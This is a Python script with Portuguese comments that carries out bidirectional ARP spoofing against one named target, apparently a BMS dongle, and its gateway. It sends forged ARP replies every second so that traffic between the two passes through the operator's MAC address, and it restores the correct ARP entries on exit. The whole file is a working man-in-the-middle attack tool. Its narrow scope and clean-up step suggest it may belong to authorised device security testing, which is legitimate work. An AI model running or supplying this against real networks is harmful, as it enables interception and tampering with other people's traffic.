#!/usr/bin/env python3
"""
ARP poison bidirecional, escopo restrito a UM alvo (o dongle do BMS).
Uso: arp_spoof.py <iface> <victim_ip> <victim_mac> <gateway_ip> <gateway_mac> <our_mac>
Encerra com SIGTERM/SIGINT e restaura as tabelas ARP.
"""
import socket
import struct
import sys
import time
import signal

if len(sys.argv) not in (7, 8):
    print(__doc__)
    sys.exit(1)

iface, victim_ip, victim_mac, gw_ip, gw_mac, our_mac = sys.argv[1:7]
ONEWAY = len(sys.argv) == 8 and sys.argv[7] == "oneway"

ETH_P_ARP = 0x0806


def mac(s):
    return bytes.fromhex(s.replace(":", "").replace("-", ""))


def ip(s):
    return socket.inet_aton(s)


def frame(dst_mac, src_mac):
    return mac(dst_mac) + mac(src_mac) + struct.pack("!H", ETH_P_ARP)


def arp(is_reply, sha, spa, tha, tpa):
    return (
        struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2 if is_reply else 1)
        + mac(sha)
        + ip(spa)
        + mac(tha)
        + ip(tpa)
    )


sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sock.bind((iface, 0))

running = True


def stop(*_):
    global running
    running = False


signal.signal(signal.SIGINT, stop)
signal.signal(signal.SIGTERM, stop)


def poison(target_mac, target_ip, claimed_ip):
    """Diz para target_ip que claimed_ip está no NOSSO mac."""
    pkt = frame(target_mac, our_mac) + arp(True, our_mac, claimed_ip, target_mac, target_ip)
    sock.send(pkt)


def restore():
    """Devolve as associações corretas."""
    sock.send(frame(victim_mac, gw_mac) + arp(True, gw_mac, gw_ip, victim_mac, victim_ip))
    if not ONEWAY:
        sock.send(frame(gw_mac, victim_mac) + arp(True, victim_mac, victim_ip, gw_mac, gw_ip))


print(f"[arp] alvo {victim_ip} ({victim_mac}) <-> gw {gw_ip} ({gw_mac}) via {our_mac}", flush=True)

try:
    while running:
        poison(victim_mac, victim_ip, gw_ip)   # dongle acha que o gateway é nós
        if not ONEWAY:
            poison(gw_mac, gw_ip, victim_ip)   # gateway acha que o dongle é nós
        time.sleep(1)
finally:
    for _ in range(3):
        restore()
        time.sleep(0.3)
    print("[arp] restaurado", flush=True)
